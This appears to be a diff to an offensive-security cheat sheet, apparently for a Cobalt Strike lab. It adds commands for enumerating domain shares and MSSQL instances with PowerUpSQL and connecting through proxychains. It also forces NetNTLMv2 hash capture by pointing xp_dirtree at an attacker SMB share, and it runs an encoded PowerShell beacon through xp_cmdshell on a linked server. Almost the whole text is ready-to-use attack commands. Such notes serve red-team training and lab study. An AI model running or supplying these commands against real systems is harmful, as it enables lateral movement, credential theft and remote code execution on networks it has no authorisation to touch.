@@ -78,6 +78,42 @@ Get User information:
   
 > beacon> powershell Get-DomainUser -Identity [username] -Properties DisplayName, MemberOf | fl
   
+Get Available Shares (important for lateral movement and GPO Abuses):
+  
+> beacon> powershell Find-DomainShare -CheckShareAccess
+  
 ## MSSQL
   
+### Enum
+
+Import PowerUpSQL
+
+Execute following statements from Domain-User context (AD Authentication on MSSQL hosts):
+
+Enum SQL Instance:
+
+> beacon> powershell Get-SQLInstanceDomain
+  
+Test connection:
+
+> beacon> powershell Get-SQLConnectionTest -Instance "srv-1.dev.cyberbotic.io,1433" | fl
+
+Retrieve additional Instance Information:
+ 
+> beacon> powershell Get-SQLServerInfo -Instance "srv-1.dev.cyberbotic.io,1433"
+  
+Test execution:
+
+> beacon> powershell Get-SQLQuery -Instance "INSTANCE,1433" -Query "select @@servername"
+  
+Proxychains for direct connection:
+  
+> root@kali:~# proxychains python3 /usr/local/bin/mssqlclient.py -windows-auth DOMAIN/USER@TARGET
+  
+NetNTLMv2 via xp_dirtree (Inveigh on Host in target network, or smbserver on Kali with WinDivert + rportfwd):
+  
+> beacon> powershell Get-SQLQuery -Instance "INSTANCE,1433" -Query "EXEC xp_dirtree '\\IP\pwn', 1, 1"
+
+Query to execute beacon on the instance directly:
+
 > SELECT * FROM OPENQUERY("[targetserver]", 'select @@servername; exec xp_cmdshell ''powershell -enc [EncodedString]''');
